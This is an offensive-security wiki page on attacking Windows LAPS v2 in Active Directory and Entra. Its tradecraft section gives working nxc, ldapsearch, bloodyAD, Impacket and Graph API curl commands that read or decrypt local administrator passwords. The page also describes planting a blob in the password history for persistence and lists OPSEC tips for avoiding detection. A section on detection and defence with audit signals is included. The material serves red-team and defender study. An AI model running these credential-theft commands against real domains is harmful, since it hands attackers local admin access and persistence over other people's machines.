---
title: Windows LAPS v2 — modern attack surface
slug: windows-laps-v2-attacks
---

> **TL;DR:** Windows LAPS (the 2023+ in-box version, not legacy Microsoft LAPS) stores local admin passwords in `msLAPS-Password` (cleartext) or `msLAPS-EncryptedPassword` (DPAPI-NG to a domain principal). Read rights leak the local admin. Encryption-decryptor rights on the protected principal still leak it. Both paths are routine on engagements where LAPS is "deployed."

## What it is
Windows LAPS ships in Windows 11 / Server 2022+ and replaces the legacy `ms-Mcs-AdmPwd`. Three new attributes appear on the computer object:
- `msLAPS-Password` — JSON: `{"n": "Administrator","t": "...","p": "cleartext"}`
- `msLAPS-PasswordExpirationTime` — FILETIME for rotation
- `msLAPS-EncryptedPassword` — DPAPI-NG blob protected to a target group or user SID
- `msLAPS-EncryptedPasswordHistory` — previous N entries, same scheme

## Preconditions / where it applies
- Active Directory with Windows LAPS policy applied via Intune or GPO
- Either Read permission on the cleartext attribute OR membership in the AD group designated as DPAPI-NG protector
- For Entra-joined devices: Intune / Entra LAPS (different storage path — Graph API)

## Tradecraft

**Discovery — find LAPS-managed machines + your read rights:**

```bash
# Cleartext attribute
nxc ldap dc01 -u low -p 'pw' -M laps
# Or raw LDAP
ldapsearch -H ldap://dc01 -D 'low@corp.local' -w 'pw' \
  -b 'DC=corp,DC=local' '(msLAPS-Password=*)' msLAPS-Password sAMAccountName
```

**Cleartext read (legacy LAPS or new LAPS with encryption disabled):**

```bash
nxc ldap dc01 -u low -p 'pw' --laps        # auto-detects msLAPS-Password
# Or
bloodyAD -u low -p 'pw' -d corp.local --host dc01 get search \
  --filter '(msLAPS-Password=*)' --attr msLAPS-Password
```

**Encrypted attribute — decrypt with DPAPI-NG when you are the protector:**

```bash
# Pull both attributes
impacket-getLAPSPassword corp.local/low:'pw'@dc01 -computer SRV01
# Internally: LDAP read msLAPS-EncryptedPassword, then DPAPI-NG root key fetch
# via MS-BKRP / MS-GKDI, then decrypt
```

`getLAPSPassword.py` (Impacket >=0.12) walks the chain: read encrypted blob, query the KDS root key from the DC (`netr_LogonGetCapabilities` + MS-GKDI `GetKey`), derive the AES key for the protector SID, decrypt.

**When you are NOT the configured protector but own a member of that group** — pivot first to a session as that user (Kerberos U2U, [[s4u2self-abuse]], or simply [[evil-winrm]] interactive), then run the decrypt from their context.

**Entra LAPS (cloud):**

```bash
# Graph API with DeviceLocalCredential.Read.All
curl -H "Authorization: Bearer $TOKEN" \
  'https://graph.microsoft.com/beta/directory/deviceLocalCredentials/{deviceId}?$select=credentials'
# Returns base64 cleartext password
```

Roles that hold this scope by default: Cloud Device Administrator, Intune Administrator — both common over-grants.

**Persistence variant:** if you can write `msLAPS-EncryptedPasswordHistory`, you can plant a known-protector encrypted blob; on next rotation the legitimate password rotates but history retains your readable entry until age-out.

## Detection and defence
- 4662 (directory access) on `msLAPS-Password` / `msLAPS-EncryptedPassword` for any account not in the LAPS read group — extremely high-value signal
- Audit subscription on the LAPS OU; alert on read by service accounts
- Use `msLAPS-EncryptedPassword` exclusively, scoped to a small protector group (not Domain Admins by default)
- Enable Password History encryption and audit its read
- For Entra LAPS: monitor Graph audit for `deviceLocalCredentials` reads — they appear as `Get-DeviceLocalCredentialInfo`
- Tier-0 boxes should NOT use the same LAPS protector group as workstations

## OPSEC pitfalls
- `nxc --laps` and `bloodyAD get search` produce LDAP queries with `msLAPS-Password=*` filter — trivial Sigma rule
- DPAPI-NG decryption requires fetching the KDS root key; MS-GKDI calls from a workstation account are abnormal
- Reading `msLAPS-EncryptedPasswordHistory` triggers the same 4662 events as the current attribute — don't assume history is unaudited

## References
- [Windows LAPS overview](https://learn.microsoft.com/windows-server/identity/laps/laps-overview)
- [Akamai — abusing Windows LAPS](https://www.akamai.com/blog/security-research/windows-laps-encryption-bypass)
- [Impacket getLAPSPassword.py](https://github.com/fortra/impacket/blob/master/examples/getLAPSPassword.py)
- [SpecterOps — LAPS attack paths in BloodHound](https://posts.specterops.io/) — `ReadLAPSPassword` edge in CE

See also: [[bloodhound]], [[acl-abuse]], [[s4u2self-abuse]], [[shadow-credentials]], [[netexec-nxc-workflow]], [[impacket-toolkit-overview]], [[dpapi-secrets]], [[gmsa-decryption]]
